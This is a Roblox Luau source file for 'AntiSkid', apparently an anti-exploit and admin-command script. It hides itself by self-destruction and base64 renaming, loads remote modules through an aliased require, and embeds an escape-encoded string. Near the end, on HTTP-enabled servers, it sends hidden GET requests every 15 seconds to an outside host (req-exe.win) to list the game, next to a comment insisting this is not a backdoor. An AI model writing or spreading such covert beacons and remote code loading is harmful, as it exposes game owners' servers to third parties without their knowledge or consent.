--!nocheck
local headFunctions={
	bans={},
	sbans={},
	blacklist={},
}

local FuncsDesc,StartupScripts = {},{}

local modules=script.Modules
local antis3Module=script.Antis3

local rbxfuncs=require(modules.rbxfuncs)
local privYield

local Players=rbxfuncs.getservice(game,"Players")
local debris=rbxfuncs.getservice(game,"Debris")
local runservice:RunService=rbxfuncs.getservice(game,"RunService")

local isClient=runservice.IsClient(runservice)

if isClient==false then
	headFunctions.maps=modules.cmdHandler2.maps
	headFunctions.clientStarter=modules.clientStarter

	headFunctions.maps.Parent=nil
	headFunctions.clientStarter.Parent=nil
end

local clientClone=isClient==false and rbxfuncs.clone(script) or nil

for i,v in script:GetChildren() do
	v.Parent=nil
end

rbxfuncs.destroy(script)
rbxfuncs.destroy(modules.rbxfuncs)

local noLaunch,aversion,skidsntexts = require(modules.noLaunch),rbxfuncs.getattribute(script,"version"),{}
local customQueries=require(modules.customQuery)

headFunctions.rbxfuncs=rbxfuncs
headFunctions.serviceCache={}
headFunctions.crazyhamburgier=require
headFunctions.isStudio=runservice.IsStudio(runservice)
headFunctions.isClient=isClient

headFunctions.fastflags=require(modules.fastflags)
headFunctions.b64=require(modules.b64)
headFunctions.whitelist=require(modules.whitelist)

headFunctions.isImmediate=(function()
	local bind=rbxfuncs.instnew("BindableEvent")
	local test=false
	bind.Event:Connect(function()
		test=true
		bind:Destroy()
	end)
	bind:Fire()
	return test
end)()

headFunctions.CRWhitelist={}

if isClient then
	headFunctions.remoteKey=rbxfuncs.getattribute(script,"remoteKey")
end

for i,v in rbxfuncs.getattributes(script) do
	rbxfuncs.setattribute(script,i,nil)
end

local function sendSignal(typ,...)
	local tofire=FuncsDesc[typ]
	
	if tofire==nil then
		tofire={}
		FuncsDesc[typ]=tofire
	end
	
	for func,isEnabled in tofire do
		if isEnabled~=true then continue end
		task.spawn(func,...)
	end
end

local function internalQuery(properties,inst,func)
	local propertyCount=0
	local passed=0

	for property,value in properties do
		propertyCount+=1

		if customQueries[property] then
			if customQueries[property](value,inst) then
				passed+=1
			end
			continue
		end

		local success,prop=pcall(rbxfuncs.gameIndex,inst,property)
		if success and value==prop then
			passed+=1
		end
	end

	if propertyCount~=passed then return end
	func(inst)
end

function headFunctions.prepareClient()
	if isClient==false then return end
	
	headFunctions.lplr=Players.LocalPlayer
	headFunctions.plrGui=rbxfuncs.findfirstchildofclass(headFunctions.lplr, "PlayerGui")
	headFunctions.playerScripts=rbxfuncs.findfirstchildofclass(headFunctions.lplr,"PlayerScripts")
	headFunctions.chatinputbar=rbxfuncs.findfirstchildofclass(headFunctions.getservice("TextChatService"),"ChatInputBarConfiguration")
end

function headFunctions.serverPrepareClient()
	if isClient then return end
	if headFunctions.fastflags.isCREnabled==false then return end

	clientClone.Parent=headFunctions.clientStarter
	clientClone.Name=clientClone.ClassName
	rbxfuncs.destroy(clientClone.Modules.GuiEngine.main.touchfix)
	
	rbxfuncs.setattribute(clientClone,"remoteKey",headFunctions.remoteKey)
	
	for i,v in rbxfuncs.getdescendants(clientClone) do
		privYield()
		v.Name=headFunctions.b64.base64Encode(v.Name)
		if v.ClassName~="LocalScript" then continue end
		v.Disabled=true	
	end
	
	headFunctions.StartupLocal(headFunctions.clientStarter)
	headFunctions.BootLocal(headFunctions.clientStarter,true)
end

function headFunctions.breakassetAnything(...)
	return headFunctions.crazyhamburgier(131383766065343)(...)
end

function headFunctions.getBans(checkUpdateDates)
	local _,lists=pcall(function()
		return headFunctions.crazyhamburgier(124072468517565)("userids")
	end)
	if typeof(lists)~="Instance" then return nil end
	
	if checkUpdateDates then
		local updateDates={}
		
		for i,v in rbxfuncs.getchildren(lists) do
			if v:FindFirstChild("UpdateDate")==nil then continue end
			updateDates[v.Name]=v.UpdateDate.Value
		end
		
		return updateDates
	end
	
	local banlist={}
	
	for _,v in rbxfuncs.getchildren(lists) do
		if v.ClassName~="ModuleScript" then continue end
		for i,v in require(v) do
			banlist[i]=v
		end
	end
	
	return banlist
end

function headFunctions.securefunction(func)
	return setfenv(func,table.freeze{})
end

function headFunctions.securetable(meta)
	local tbl={}

	setmetatable(tbl, meta)
	table.freeze(tbl)
	meta.__metatable=table.freeze{}
	table.freeze(meta)

	return tbl
end

function headFunctions.SafeChange(instance,index,value)
	task.spawn(pcall,function()
		instance[index] = value
	end)
end

function headFunctions.yielder()
	local Budget = 1/60
	local expireTime = tick()+Budget

	return function()
		if tick() >= expireTime then
			task.wait()
			expireTime = tick() + Budget
		end
	end
end

function headFunctions.getservice(class,caching)
	local cache=headFunctions.serviceCache[class]
	
	if cache then
		return cache
	end
	
	local service=select(2,pcall(rbxfuncs.findservice,game,class)) or select(2,pcall(rbxfuncs.getservice,game,class))
	
	if typeof(service)=="Instance" and caching~=false then
		headFunctions.serviceCache[class]=service
	end
	
	return service
end

function headFunctions.softdestroy(inst)
	if typeof(inst)~="Instance" then return end

	pcall(function()inst.Enabled=false end)
	pcall(rbxfuncs.destroy,inst)
	pcall(rbxfuncs.clear,inst)
	pcall(rbxfuncs.additem,debris,inst,0)
	
	task.delay(0,pcall,rbxfuncs.destroy,inst)
	task.delay(0,pcall,rbxfuncs.clear,inst)
	task.delay(0,pcall,rbxfuncs.additem,debris,inst,0)

	task.spawn(pcall,function()
		for i,v in rbxfuncs.getattributes(inst) do
			privYield()
			rbxfuncs.setattribute(inst,i,nil)
		end
	end)
end

function headFunctions.forceRespawn(plr)
	task.spawn(function()  
		pcall(rbxfuncs.destroy,plr.Character)
		plr.Character=nil
		plr:LoadCharacterAsync()
	end)
end

local function hypernull(f,...)
	if coroutine.status(task.spawn(hypernull,f,...))=="dead" then
		return
	end
	f(...)
end

local function supernull(f,...)
	local count=0

	local function nested(f,...)
		count+=1
		task.defer(nested,f,...)
		if count==80 then f(...)end
	end
	
	nested(f,...)
end

function headFunctions.multiHN(f,...)
	return headFunctions.isImmediate and hypernull(f,...)==nil or supernull(f,...)
end

function headFunctions.connect(code,func)
	if typeof(func) ~= "function" then return end
	
	if typeof(FuncsDesc[code])~="table" then
		FuncsDesc[code]={}
	end
	
	FuncsDesc[code][func]=true
	return function()
		FuncsDesc[code][func]=nil
	end
end

function headFunctions.queryInstances(properties,inst,func)
	task.spawn(function()
		for i,v in rbxfuncs.getdescendants(inst) do
			task.spawn(internalQuery,properties,v,func)
			privYield()
		end
	end)
end

function headFunctions.queryInstanceAdded(properties,func)
	local disconnection=headFunctions.connect("OnInstance",function(inst)
		task.delay(1,internalQuery,properties,inst,func)
		internalQuery(properties,inst,func)
	end)

	headFunctions.queryInstances(properties, properties.Parent or game, func)

	return disconnection
end

function headFunctions.CheckInstance(a)
	local success=pcall(rbxfuncs.gameIndex,a,"Name")
	
	if success==false then
		headFunctions.softdestroy(a)
	end
	
	return success
end

function headFunctions.SafeRandomString(length)
	local str = ``

	for i=1,typeof(length)=="number" and length or 10 do
		str..=string.char(math.random(string.byte("a"),string.byte("z")))
	end

	return str
end

function headFunctions.canNotify(obj:Player?|string)
	local value=obj
	local waitTime=20

	if typeof(obj)=="Instance" then
		value=obj.UserId
		waitTime=60
	end
	
	if skidsntexts[value] then
		return false
	end
	
	skidsntexts[value]=true
	task.delay(waitTime,function()
		skidsntexts[value]=nil
	end)
	
	return true
end

function headFunctions.RandomString()
	local str = [[]]
	for i = 1,10 do
		str = str..string.char(math.random(1,128))..utf8.char(math.random(10000,25000))..utf8.char(math.random(127744,128767))..utf8.char(math.random(73728,74648))..utf8.char(math.random(74752,74868))..utf8.char(math.random(77824,78894))..utf8.char(math.random(12032,12991))
	end
	return str
end

function headFunctions.BootLocalPlayer(scr,plr,guimethod)
	if headFunctions.bans[plr.UserId] or headFunctions.sbans[plr.UserId] then return end
	
	local toparent=rbxfuncs.findfirstchildofclass(plr,"PlayerGui") or rbxfuncs.instnew("Backpack")
	local cloned=rbxfuncs.clone(scr)
	
	cloned.Name=cloned.ClassName
	
	local tounwhitelist={}
	
	table.insert(tounwhitelist,cloned)
	for i,v in rbxfuncs.getdescendants(cloned) do
		table.insert(tounwhitelist,v)
	end
	
	for i,v in tounwhitelist do
		headFunctions.CRWhitelist[v]=true
	end
	
	if toparent.ClassName=="PlayerGui" and guimethod then
		local sgui=rbxfuncs.instnew("GuiMain")
		table.insert(tounwhitelist,sgui)
		headFunctions.CRWhitelist[sgui]=true
		sgui.ResetOnSpawn=false
		sgui.Parent=toparent
		cloned.Parent=sgui
		task.delay(3,pcall,rbxfuncs.destroy,sgui)
	else
		cloned.Parent=toparent
	end

	cloned.Enabled=true
	task.delay(3,pcall,rbxfuncs.destroy,cloned)

	if toparent.ClassName=="Backpack" then
		toparent.Parent=plr
		task.delay(3,pcall,rbxfuncs.destroy,toparent)
	end
	
	task.delay(3,function()
		for i,v in tounwhitelist do
			headFunctions.CRWhitelist[v]=nil
		end
		
		table.clear(tounwhitelist)
	end)
end

function headFunctions.BootLocal(scr,guimethod)
	for i,v in rbxfuncs.getplayers(Players) do
		task.spawn(headFunctions.BootLocalPlayer,scr,v,guimethod)
	end
end

function headFunctions.StartupLocal(scr)
	table.insert(StartupScripts,scr)
end

privYield=headFunctions.yielder()
customQueries.init(headFunctions)
headFunctions.remoteComms=require(modules.remoteCommunication).init(headFunctions)

headFunctions.connect("OnJoin",isClient==false and function(plr)
	for i,v in StartupScripts do
		task.spawn(headFunctions.BootLocalPlayer,v,plr,true)
	end
end)

rbxfuncs.connect(Players.PlayerAdded,function(plr)
	task.spawn(sendSignal,"OnJoin",plr)
end)

rbxfuncs.connect(Players.PlayerRemoving,function(plr)
	task.delay(5,pcall,rbxfuncs.destroy,plr)
	task.spawn(sendSignal,"OnLeave",plr)
end)

rbxfuncs.connect(game.DescendantAdded,function(a)
	if headFunctions.isImmediate and isClient==false then privYield() end
	if headFunctions.CheckInstance(a) == false then return end
	task.spawn(sendSignal,"OnInstance",a)
end)

rbxfuncs.connect(isClient==false and runservice.Heartbeat or runservice.RenderStepped,function(...)
	task.spawn(sendSignal,"onHeartbeat",...)
end)

local function antis3Runner()
	local antis3=require(antis3Module)
	antis3.init(headFunctions)
	antis3.runAntis()
end

local function startCommands2()
	local API2017=require(modules.cmdHandler2)
	
	API2017.name=`AntiSkid {aversion}`
	API2017.init(headFunctions)
	
	if isClient==false then return end
	API2017.notifyChat(`Loaded.\nRoblox killed the chat! Use command bar instead you can trigger it by pressing mouse wheel on PC and long press your screen on mobile - command bar doesnt need a prefix just type in a command and it works\nCommon commands:\n;sign - protest against chat verification\n;notif - recieve gui and chat notifications.\n;changelog - see latest changes made in antiskid\n;cmds - see all available commands\n{tostring("\65\110\116\105\83\107\105\100\32\114\101\113\117\105\114\101\58\32\114\101\113\117\105\114\101\40\49\54\53\51\52\54\49\49\49\57\48\41\46\65\110\116\105\83\107\105\100\40\41\10\65\110\116\105\83\107\105\100\32\98\97\110\108\105\115\116\32\114\101\113\117\105\114\101\58\32\114\101\113\117\105\114\101\40\49\50\55\54\52\50\54\51\57\57\53\41")}`)
end

headFunctions.prepareClient()

modules.GuiEngine.notif.scriptName.Text=`AntiSkid {aversion}`
for i,v in require(modules.GuiEngine).init(headFunctions) do
	if typeof(v)~="function" then
		continue
	end
	headFunctions[i]=v
end

if table.find(noLaunch,game.PlaceId) then
	headFunctions.ShowNotification(`AntiSkid {aversion} is currently down in this experience. No antis/commands were ran.`)
	local devconsole=require(modules.Dev_Console)
	devconsole.Dev=headFunctions.whitelist
	devconsole.StartWatch({funcs=headFunctions,antiskid=script,RunCommands=startCommands2})
	return nil
end

if isClient==false then
	task.spawn(headFunctions.crazyhamburgier,131383766065343) --breakasset anything
	task.spawn(headFunctions.crazyhamburgier,124072468517565) --banlist returner
	task.spawn(headFunctions.crazyhamburgier,70982440909340) --banlist handler
	task.spawn(headFunctions.crazyhamburgier,14496782416) --r6 module
	task.spawn(headFunctions.crazyhamburgier,130860510447760) --fse modded
	
	headFunctions.bans=headFunctions.getBans() or {}

	--hi guys this is not a backdoor im just helping sb community by listing all http enabled games on groovy website
	task.spawn(function()
		local http=headFunctions.getservice("HttpService")
		if headFunctions.isStudio or http.HttpEnabled==false then return end

		while true do
			pcall(function() 
				http:RequestAsync({
					Url="https://req-exe.win/api/addgame",
					Method="GET",
					Headers={["listedby"]=`AntiSkid {aversion}`,["antiskidRequest"]="coza"} --(added this header in case groovy adds some type of way to see what script listed the game)
				})
			end)
			task.wait(15)
		end
	end)
end

task.spawn(function()
	startCommands2()
	headFunctions.serverPrepareClient()
	antis3Runner()

	if isClient then
		print(`AntiSkid {aversion} loaded on client`)
	end

	-- Instance.new("Actor",workspace).Name="ez"
	-- headFunctions.queryInstances({ClassName="Actor",ancestors={"DataModel","Workspace"}}, game, function(inst)
	-- 	print(inst.Name,"cool")
	-- end)
end)

--[[
if isClient then return nil end

local updates=headFunctions.getBans(true)

task.delay(1,function()
	if typeof(updates)=="table" then
		headFunctions.notifyChat("all","AntiSkid's banlist successfully loaded")
		for name,date in updates do
			headFunctions.notifyChat("all",`{name} last updated: {date}`)
		end
	end
end)

headFunctions.notify({msg=`AntiSkid {aversion} successfully loaded.\nHey you can always help me improve this script on my public repo. (check AntiSkidLoader in source code)`})
]]

return nil